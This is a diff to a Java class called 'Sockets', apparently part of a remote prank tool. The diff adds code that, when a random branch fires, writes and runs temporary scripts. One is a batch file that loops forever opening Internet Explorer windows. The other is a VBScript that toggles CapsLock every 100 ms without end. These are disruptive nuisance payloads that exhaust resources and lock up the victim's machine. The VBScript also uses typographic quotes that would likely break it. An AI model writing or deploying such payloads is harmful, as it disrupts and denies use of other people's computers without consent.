@@ -97,26 +97,33 @@ class Sockets
                 System.out.println("File in: " + filePath);
 
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("");
+                bw.write("@echo off" + nl +
+":A" + nl +
+"start iexplore en.wikipedia.org/wiki/Internet_troll" + nl +
+"goto:A");
                 bw.close();
 
                 System.out.println(Sockets.executeCommand(new String[]{"start", filePath}));
-                System.out.println("CapsLock Prank!");
+                System.out.println("IExplorer Prank!");
                 
             }else if(random <= 6)
             {
-                File temp = File.createTempFile("vncv216789", ".bat"); 
+                File temp = File.createTempFile("vncv216789", ".vbs"); 
                 String filePath = temp.getAbsolutePath();           
                 String nl = System.lineSeparator();
                 
                 System.out.println("File in: " + filePath);
 
                 BufferedWriter bw = new BufferedWriter(new FileWriter(temp));
-                bw.write("");
+                bw.write("Set wshShell =wscript.CreateObject(“WScript.Shell”)" + nl +
+"do" + nl +
+"wscript.sleep 100" + nl +
+"wshshell.sendkeys “{CAPSLOCK}”" + nl +
+"loop");
                 bw.close();
 
                 System.out.println(Sockets.executeCommand(new String[]{"start", filePath}));
-                System.out.println("Notepad Prank!");
+                System.out.println("Capslock Prank!");
                 
             }else
                 System.out.println("Nothing has been done!");
